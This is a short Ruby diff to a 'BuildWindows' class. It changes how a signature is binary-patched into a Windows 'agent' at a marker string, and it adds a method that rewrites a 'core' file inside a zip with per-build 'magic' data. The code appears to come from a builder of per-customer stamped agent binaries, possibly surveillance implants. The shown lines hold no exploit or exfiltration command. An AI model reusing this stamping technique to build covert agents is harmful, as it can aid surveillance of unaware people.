@@ -74,7 +74,11 @@ class BuildWindows < Build
       begin
         sign = ::Signature.where({scope: 'agent'}).first
         signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-        content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+
+        marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
+        magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+
+        content.binary_patch marker, signature
       rescue
         raise "Signature marker not found"
       end
@@ -208,6 +212,14 @@ class BuildWindows < Build
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
+  end
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('core', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('core', "wb") { |f| f.write core_content }
+    end
   end
 
   def ghost(params)
